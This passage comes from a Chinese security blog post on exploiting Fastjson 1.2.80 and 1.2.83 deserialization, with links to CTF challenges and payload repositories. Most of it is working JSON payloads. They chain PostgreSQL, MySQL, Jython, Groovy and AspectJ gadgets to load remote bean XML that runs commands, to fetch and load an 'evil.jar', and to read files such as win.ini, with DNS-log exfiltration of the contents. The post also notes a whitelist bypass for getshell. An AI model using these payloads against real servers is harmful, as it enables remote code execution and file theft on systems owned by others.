&lt; fastjson &lt;&#x3D; 1.2.80\njackson-core\n9.4.1208 &lt;&#x3D; org.postgresql:postgresql &lt; 42.2.25 \n42.3.0 &lt;&#x3D; org.postgresql:postgresql &lt; 42.3.2\n[INFO] Step1:&#123;&quot;a&quot;:&quot;&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.Exception\\&quot;,\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.exc.InputCoercionException\\&quot;,\\&quot;p\\&quot;:&#123;&#125;&#125;&quot;,&quot;b&quot;:&#123;&quot;$ref&quot;:&quot;$.a.a&quot;&#125;,&quot;c&quot;:&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.JsonParser\\&quot;,\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\\&quot;,\\&quot;in\\&quot;:&#123;&#125;&#125;&quot;,&quot;d&quot;:&#123;&quot;$ref&quot;:&quot;$.c.c&quot;&#125;&#125;[INFO] Step2:&#123;    &quot;x1&quot;: &#123;        &quot;@type&quot;: &quot;java.io.InputStream&quot;,        &quot;@type&quot;: &quot;org.postgresql.copy.PGCopyInputStream&quot;,        &quot;connection&quot;: &#123;            &quot;@type&quot;: &quot;org.postgresql.jdbc.PgConnection&quot;,            &quot;hostSpecs&quot;: [                &#123;                    &quot;host&quot;: &quot;127.0.0.1&quot;,                    &quot;port&quot;: 2333                &#125;            ],            &quot;user&quot;: &quot;root&quot;,            &quot;database&quot;: &quot;root&quot;,            &quot;info&quot;: &#123;                &quot;socketFactory&quot;: &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;,                &quot;socketFactoryArg&quot;: &quot;http://127.0.0.1:8080/bean.xml&quot;            &#125;        &#125;    &#125;&#125;\n\nxml文件：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;        &lt;constructor-arg&gt;            &lt;list&gt;                &lt;value&gt;cmd&lt;/value&gt;                &lt;value&gt;/c&lt;/value&gt;                &lt;value&gt;calc&lt;/value&gt;            &lt;/list&gt;        &lt;/constructor-arg&gt;    &lt;/bean&gt;&lt;/beans&gt;\n\n可以去java-chains生成：\n\njython依赖&#123;    &quot;a&quot;:&#123;    &quot;@type&quot;:&quot;java.lang.Exception&quot;,    &quot;@type&quot;:&quot;org.python.antlr.ParseException&quot;,    &quot;type&quot;:&#123;&#125;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;org.python.core.PyObject&quot;,        &quot;@type&quot;:&quot;com.ziclix.python.sql.PyConnection&quot;,        &quot;connection&quot;:&#123;            &quot;@type&quot;:&quot;org.postgresql.jdbc.PgConnection&quot;,            &quot;hostSpecs&quot;:[                &#123;                    &quot;host&quot;:&quot;127.0.0.1&quot;,                    &quot;port&quot;:2333                &#125;            ],            &quot;user&quot;:&quot;user&quot;,            &quot;database&quot;:&quot;test&quot;,            &quot;info&quot;:&#123;                &quot;socketFactory&quot;:&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;,                &quot;socketFactoryArg&quot;:&quot;http://127.0.0.1:8090/exp.xml&quot;            &#125;,            &quot;url&quot;:&quot;&quot;        &#125;    &#125;&#125;\n\nMySqlJDBCmysql &lt;&#x3D; 5.1.48\n出网：\n[INFO] Step1:&#123;&quot;a&quot;:&quot;&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.Exception\\&quot;,\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.exc.InputCoercionException\\&quot;,\\&quot;p\\&quot;:&#123;&#125;&#125;&quot;,&quot;b&quot;:&#123;&quot;$ref&quot;:&quot;$.a.a&quot;&#125;,&quot;c&quot;:&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.JsonParser\\&quot;,\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\\&quot;,\\&quot;in\\&quot;:&#123;&#125;&#125;&quot;,&quot;d&quot;:&#123;&quot;$ref&quot;:&quot;$.c.c&quot;&#125;&#125;[INFO] Step2:&#123;\t&quot;@type&quot;: &quot;java.io.InputStream&quot;,\t&quot;@type&quot;: &quot;com.mysql.jdbc.CompressedInputStream&quot;,\t&quot;conn&quot;:&#123;\t\t&quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;,\t\t&quot;hostToConnectTo&quot;: &quot;127.0.0.1&quot;,\t\t&quot;portToConnectTo&quot;: 3308,\t\t&quot;info&quot;: &#123;\t\t\t&quot;user&quot;: &quot;mysql&quot;,\t\t\t&quot;password&quot;: &quot;pass&quot;,\t\t\t&quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,\t\t\t&quot;autoDeserialize&quot;: &quot;true&quot;,\t\t\t&quot;NUM_HOSTS&quot;: &quot;1&quot;\t\t&#125;,\t\t&quot;databaseToConnectTo&quot;: &quot;dbname&quot;,\t&#125;&#125;\n\n\n\n不出网，需要先写Pipe文件：\n[INFO] Step1:&#123;&quot;a&quot;:&quot;&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.Exception\\&quot;,\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.exc.InputCoercionException\\&quot;,\\&quot;p\\&quot;:&#123;&#125;&#125;&quot;,&quot;b&quot;:&#123;&quot;$ref&quot;:&quot;$.a.a&quot;&#125;,&quot;c&quot;:&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.JsonParser\\&quot;,\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\\&quot;,\\&quot;in\\&quot;:&#123;&#125;&#125;&quot;,&quot;d&quot;:&#123;&quot;$ref&quot;:&quot;$.c.c&quot;&#125;&#125;[INFO] Step2:&#123;&quot;@type&quot;:&quot;java.io.InputStream&quot;,&quot;@type&quot;:&quot;com.mysql.jdbc.CompressedInputStream&quot;,&quot;conn&quot;:&#123;&quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,&quot;hostToConnectTo&quot;:&quot;127.0.0.1&quot;,&quot;portToConnectTo&quot;:3306,&quot;info&quot;:&#123;&quot;useSSL&quot;:&quot;false&quot;,&quot;user&quot;:&quot;mysql&quot;,&quot;HOST&quot;:&quot;xxx&quot;,&quot;statementInterceptors&quot;:&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;,&quot;NUM_HOSTS&quot;:&quot;1&quot;,,&quot;socketFactory&quot;:&quot;com.mysql.jdbc.NamedPipeSocketFactory&quot;,&quot;namedPipePath&quot;:&quot;[Pipe_file_path]&quot;,&quot;DBNAME&quot;:&quot;test&quot;&#125;,&quot;databaseToConnectTo&quot;:&quot;test&quot;,&quot;url&quot;:&quot;&quot;&#125;&#125;\n\n\n\ngroovy（出网加载jar）1.2.76 &lt;&#x3D; fastjson &lt; 1.2.83\n// 第一次发包&#123;    &quot;@type&quot;:&quot;java.lang.Exception&quot;,    &quot;@type&quot;:&quot;org.codehaus.groovy.control.CompilationFailedException&quot;,    &quot;unit&quot;:&#123;&#125;&#125;// 第二次发包&#123;    &quot;@type&quot;:&quot;org.codehaus.groovy.control.ProcessingUnit&quot;,    &quot;@type&quot;:&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;,    &quot;config&quot;:&#123;     &quot;@type&quot;:&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;,     &quot;classpathList&quot;:&quot;http://127.0.0.1:8090/evil.jar&quot;    &#125;&#125;\n\n利用的是SPI机制，在yaml反序列化的时候接触过。\n在src目录下创建 META-INF&#x2F;services&#x2F;org.codehaus.groovy.transform.ASTTransformation， 写入恶意类的全类名。\n然后执行（恶意jar包名称什么的可以改）：\njavac src/artsploit/AwesomeScriptEngineFactory.javajar -cvf yaml-payload.jar -C src/ .\n\n\n\njava-chains也可以直接生成：\n\naspectjtools读文件（需回显）//第一次&#123;    &quot;@type&quot;:&quot;java.lang.Exception&quot;,    &quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;&#125;// 第二次&#123;    &quot;@type&quot;:&quot;java.lang.Class&quot;,    &quot;val&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.String&quot;&#123;        &quot;@type&quot;:&quot;java.util.Locale&quot;,        &quot;val&quot;:&#123;            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,             &#123;                &quot;@type&quot;:&quot;java.lang.String&quot;                &quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;,                &quot;newAnnotationProcessorUnits&quot;:[&#123;&#125;]            &#125;        &#125;    &#125;// 第三次&#123;    &quot;x&quot;:&#123;        &quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;,        &quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,        &quot;fileName&quot;:&quot;c:/windows/win.ini&quot;    &#125;&#125;// 第三次，报错回显&#123;\t&quot;@type&quot;: &quot;java.lang.Character&quot; &#123;\t\t&quot;C&quot;: &#123;\t\t\t&quot;x&quot;: &#123;\t\t\t\t&quot;@type&quot;: &quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;,\t\t\t\t&quot;@type&quot;: &quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,\t\t\t\t&quot;fileName&quot;: &quot;D:/flag.txt&quot;\t\t\t&#125;\t\t&#125;\t&#125;&#125;// 第三次，dns回显&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,&quot;fileName&quot;:&quot;/Users/su18/Downloads/1.txt&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&#123;&quot;@type&quot;:&quot;java.util.Locale&quot;, &quot;val&quot;:&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&#123;&quot;@type&quot;: &quot;java.lang.String&quot;&quot;@type&quot;:&quot;java.util.Locale&quot;, &quot;language&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&#123;&quot;$ref&quot;:&quot;$&quot;&#125;,&quot;country&quot;:&quot;aw.su18.dnslog.pw&quot;&#125;&#125;&#125;&#125;&#125;\n\n\n\nognl+io读写文件&#x2F;目录遇见的情况比较少，不整理了，直接给链接（懒癌犯了）\n首次出现于KCON2022\n[https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf](https://github.com/knownsec/KCon/blob/master/2022/Hacking JSON【KCon2022】.pdf) \nhttps://github.com/kezibei/fastjson_payload/blob/main/src/test/Fastjson22_ognl_io_read_error_dnslog.java\nhttps://github.com/su18/hack-fastjson-1.2.80\n读文件时需要结合各种方式回显，比如http、dns、报错等。或是逐个字节读，根据报错情况或者是否发起http请求来判断。\najt+xalan+dom4j+iohttps://github.com/kezibei/fastjson_payload/blob/main/src/test/Fastjson21_ajt_xalan_dom4j_io_read_httplog.java\n这些依赖组合起来比较少见，也许会在某些框架的项目中经常出现？受限于笔者知识，这里不深入了。\n后面还有一系列不需要ajt依赖的。\nhttps://github.com/kezibei/fastjson_payload/blob/main/src/test/Fastjson27_xalan_dom4j_io_read_error_dnslog.java\n1.2.83https://flowerwind.github.io/2025/02/28/%E5%88%86%E4%BA%AB%E4%B8%80%E6%AC%A1%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8B%BF%E4%B8%8B%E7%9B%AE%E6%A0%87/\n配合写文件漏洞，依然有可能getshell。\n83版本通过@type加载类时，有白名单机制，但是可以通过 @JSONType等注解绕过：\n\n这时候，配合写tomcat-docbase或是写jar，然后@type触发，依然有机会getshell。\n相关题目https://github.com/luelueking/CVE-2022-25845-In-Spring\n[https://github.com/cwkiller/Java-Puzzle/tree/main/Fastjson%20Decoder](https://github.com/cwkiller/Java-Puzzle/tree/main/Fastjson Decoder)  \nhttps://github.com/1diot9/CTFJavaChallenge/tree/main/2025/%E4%BA%AC%E9%BA%92CTF  \nhttps://mp.weixin.qq.com/s/GEGPpQ_1nflO_w4cefB-xA \nhttp://www.bmth666.cn/2022/10/19/Fastjson%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/  \nhttps://flowerwind.github.io/2025/02/28/%E5%88%86%E4%BA%AB%E4%B8%80%E6%AC%A1%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8B%BF%E4%B8%8B%E7%9B%AE%E6%A0%87/  83版本，配合其他写文件漏洞，也能getshell\nhttps://1diot9.github.io/2026/02/18/%E4%BA%AC%E9%BA%92CTF25-FastJ/   JDK11写漏洞在80版本的特殊利用\n后记感谢前辈们的优秀文章，让笔者学习到了很多新知识。\n看完才想起来还有个fastjson2，利用方式不太一样，又得学了（\n网上开源的fastjson扫描工具都好久没更新了，找不到合适的，以后有需求再让AI一点点写吧，或者直接让二开一下。\n很多payload都是来源于KCON和GEEKCON会议的，以后有空收集一下各种会议里有关Java的PPT，也是一种学习方式。\n参考springboot环境下的写文件RCEFastjson高版本的奇技淫巧Fastjson反序列化漏洞复现 | Yang Hao’s blog \nFastjson commons-io任意文件读写fastjson 读文件 gadget 的利用场景扩展[漏洞篇 - Fastjson 1.2.68 - 1.2.80 利用](https://changeyourway.github.io/2025/08/23/Java 安全&#x2F;漏洞篇-Fastjson 1.2.68-1.2.80 利用&#x2F;#PostgreSQL-JDBC)fastjson 1.2.80 漏洞分析[Fastjson 1.2.80 读写文件 &amp; SpringBoot利用 &amp; Postgresql利用](https://kagty1.github.io/2026/01/18/Fastjson 1.2.80 读写文件 &amp; SpringBoot利用 &amp; Postgresql利用_cos&#x2F;#postgresql-利用) GitHub - lemono0&#x2F;FastJsonParty: FastJson全版本Docker漏洞环境(涵盖1.2.47&#x2F;1.2.68&#x2F;1.2.80等版本)，主要包括JNDI注入及高版本绕过、waf绕过、文件读写、原生反序列化、利用链探测绕过、不出网利用等。从黑盒的角度覆盖FastJson深入利用炒冷饭之FastJson \nfastjson 1.2.80的一些小链\n","categories":["Java安全"],"tags":["Java安全"]}]